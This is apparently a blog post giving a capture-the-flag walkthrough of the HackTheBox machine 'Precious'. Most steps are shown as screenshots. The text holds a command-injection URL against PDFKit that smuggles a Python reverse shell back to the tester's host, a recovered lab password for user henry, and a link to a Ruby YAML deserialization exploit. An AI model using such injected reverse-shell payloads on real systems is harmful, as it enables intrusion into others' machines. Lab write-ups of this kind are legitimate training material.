---
layout: post
title: HackTheBox | Precious
categories: HackTheBox
---

# HackTheBox | Precious

+++++++++++++++++++++++++++++++++++\
IP: 10.10.11.189\
Date: 06-01-2023\
+++++++++++++++++++++++++++++++++++

##  Fase 1: Recon

### Nmap scan

<img width="450" alt="image" src="https://user-images.githubusercontent.com/115549820/210967185-ca577e6a-7d2d-44b8-a90a-dc109092b740.png">

**Open Ports**

22 - SSH - OpenSSH 8.4p1\
80 - HTTP - nginx 1.18.0\

### Webserver Enumeration

***Dirbuster output***

<img width="450" alt="image" src="https://user-images.githubusercontent.com/115549820/210976430-2898ba1c-ba1f-4681-b6c9-166a719aa244.png">

***Nikto output***

<img width="600" alt="image" src="https://user-images.githubusercontent.com/115549820/210973371-f48622e9-a6e1-4774-af93-67f8a2ed9656.png">

***Homepage***

<img width="750" alt="image" src="https://user-images.githubusercontent.com/115549820/210976612-969f1072-3930-434b-9159-f37b7c3e71ba.png">

<img width="750" alt="image" src="https://user-images.githubusercontent.com/115549820/210976939-536f5211-3a1f-4b04-bff1-3a23cf1f4313.png">

<img width="750" alt="image" src="https://user-images.githubusercontent.com/115549820/210978740-24b4a049-28c0-41e2-95a2-1abc3f67040c.png">

***Burpsuit***

<img width="750" alt="image" src="https://user-images.githubusercontent.com/115549820/210979232-455f67e8-0778-440f-a4fe-6cdb363c9d51.png">

***Uploading ruby shell***

<img width="650" alt="image" src="https://user-images.githubusercontent.com/115549820/210979450-236f482c-50e8-41b6-a5d6-2361479cc447.png">

<img width="350" alt="image" src="https://user-images.githubusercontent.com/115549820/210980221-bb2377e5-d87e-4380-9c7d-55b997c7171d.png">

<img width="640" alt="image" src="https://user-images.githubusercontent.com/115549820/210980478-e4e6aeac-97a8-4f77-9914-a456ab8c6e7c.png">

<img width="350" alt="image" src="https://user-images.githubusercontent.com/115549820/210980713-faf48e9c-0cda-49f4-ac3f-666ad5b31ff5.png">

***Shell???***

<img width="376" alt="image" src="https://user-images.githubusercontent.com/115549820/210988024-606b1517-b583-4d74-9ee4-721a15bf3535.png">

***Covert webpage to PDF***

Remote url is not possible

Try a local url

<img width="376" alt="image" src="https://user-images.githubusercontent.com/115549820/210989391-dc1ff35b-f3fc-40dd-8d0b-bcde76d3b37c.png">

<img width="379" alt="image" src="https://user-images.githubusercontent.com/115549820/210989689-df1807d7-fc70-4388-92f1-da4ccbbfb697.png">

<img width="425" alt="image" src="https://user-images.githubusercontent.com/115549820/210989926-bb8f7478-ba77-4fb0-84f3-fe338b9bacd5.png">


## Fase 2: Getting Access

***PDF inspection***

<img width="403" alt="image" src="https://user-images.githubusercontent.com/115549820/210991976-0e335f17-ff27-4d12-ac79-eaf5c1d0e2ac.png">

https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

> String for shell, ruby and php doesnt work
> http://10.10.14.10/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",9996));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`

<img width="468" alt="image" src="https://user-images.githubusercontent.com/115549820/210998267-f50647ad-4f4b-44d2-8c92-157d67aa0bd7.png">

<img width="578" alt="image" src="https://user-images.githubusercontent.com/115549820/210998316-ac891112-d8ee-4829-8582-a8d518fd8585.png">

  
## Fase 3: Intern Enumeration

<img width="494" alt="image" src="https://user-images.githubusercontent.com/115549820/210998989-3c2eeb42-b65e-43a1-93c5-57299373f1d6.png">

<img width="494" alt="image" src="https://user-images.githubusercontent.com/115549820/210999083-7489fb5c-a3b1-40fa-8bd0-f1988fa06507.png">

<img width="574" alt="image" src="https://user-images.githubusercontent.com/115549820/210999462-e88dbe3c-b7d3-4d8f-8723-9f5af73b5637.png">

***Upload linpeas.sh***

<img width="574" alt="image" src="https://user-images.githubusercontent.com/115549820/211000298-452c5a80-55e0-4344-af64-f8d87cfeafba.png">

***Linpeas output***

<img width="571" alt="image" src="https://user-images.githubusercontent.com/115549820/211000798-f7b0c2b4-b280-4200-aef7-0125bfdc516c.png">

<img width="571" alt="image" src="https://user-images.githubusercontent.com/115549820/211000931-70c7b2c6-bd41-4b6f-929b-55597c20bdf5.png">

<img width="571" alt="image" src="https://user-images.githubusercontent.com/115549820/211001324-161a8347-d2da-4dd4-ab93-829b5d01e3d8.png">

<img width="571" alt="image" src="https://user-images.githubusercontent.com/115549820/211001851-c70ebd3f-a86b-48d3-b034-44cddef48119.png">

<img width="571" alt="image" src="https://user-images.githubusercontent.com/115549820/211001943-afb42d3a-6088-488e-be9e-6d217426db82.png">

***.bundle/config***

<img width="571" alt="image" src="https://user-images.githubusercontent.com/115549820/211002491-29b82ff7-cdc5-4b55-a00a-18c272308e39.png">

> Possible Credential for Henry
> henry:Q3c1AqGHtoI0aXAYFH

***Login with creds***

<img width="567" alt="image" src="https://user-images.githubusercontent.com/115549820/211003296-eaa350fd-cbdc-44cf-8e7c-7effe585b461.png">

***user.txt***

<img width="566" alt="image" src="https://user-images.githubusercontent.com/115549820/211008892-99b7c2d1-34a7-486f-8149-6c0c8a175770.png">
  
## Fase 4: PrivEsc

<img width="566" alt="image" src="https://user-images.githubusercontent.com/115549820/211009147-4f57a6f8-b061-4bb4-9fb3-c82d5a7427de.png">

***/opt/***

<img width="566" alt="image" src="https://user-images.githubusercontent.com/115549820/211009384-15639b10-8c85-44c0-9eb4-5f59ab01a309.png">

***update_dependencies.rb***

<img width="566" alt="image" src="https://user-images.githubusercontent.com/115549820/211009720-b24444c0-8870-4ac4-9f70-e640010c2cdd.png">

***dependencies.yml***

<img width="566" alt="image" src="https://user-images.githubusercontent.com/115549820/211009790-e6fae937-6cd7-4011-865b-0b33a51389cd.png">

***No write priv in opt direcotory***

<img width="566" alt="image" src="https://user-images.githubusercontent.com/115549820/211013669-751cf43b-0fe1-4343-ae63-3ddff6f26bf1.png">

***Creating yml file***

https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml



## HackTheBox Questions
